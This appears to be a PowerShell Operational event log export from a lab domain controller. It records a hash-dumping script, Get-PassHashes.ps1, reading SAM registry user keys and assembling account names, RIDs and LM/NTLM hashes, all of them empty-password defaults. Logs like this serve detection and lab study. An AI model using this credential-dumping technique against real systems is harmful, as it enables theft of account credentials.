ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount; id=504; lm=aad3b435b51404eeaad3b435b51404ee}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 142
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.588943500Z" />
    <EventRecordID>14252</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f83a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 142
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount; id=504; lm=aad3b435b51404eeaad3b435b51404ee}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount; id=504}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 140
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.588673100Z" />
    <EventRecordID>14251</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f73a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 140
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount; id=504}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="504"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 138
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.588391700Z" />
    <EventRecordID>14250</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f63a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 138
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="504"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=WDAGUtilityAccount}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="WDAGUtilityAccount"
ParameterBinding(Add-Member): name="InputObject"; value=""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 136
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.588028700Z" />
    <EventRecordID>14249</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f53a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 136
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="WDAGUtilityAccount"
ParameterBinding(Add-Member): name="InputObject"; value=""
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 134
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.587592600Z" />
    <EventRecordID>14248</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f33a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 134
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount; id=503; lm=aad3b435b51404eeaad3b435b51404ee}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 132
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.586727600Z" />
    <EventRecordID>14247</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f03a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 132
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount; id=503; lm=aad3b435b51404eeaad3b435b51404ee}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount; id=503}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 130
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.586524000Z" />
    <EventRecordID>14246</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-ef3a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 130
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount; id=503}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="503"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 128
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.586272500Z" />
    <EventRecordID>14245</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-ee3a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 128
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="503"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="DefaultAccount"
ParameterBinding(Add-Member): name="InputObject"; value=""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 126
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.586039900Z" />
    <EventRecordID>14244</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-ed3a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 126
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="DefaultAccount"
ParameterBinding(Add-Member): name="InputObject"; value=""
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
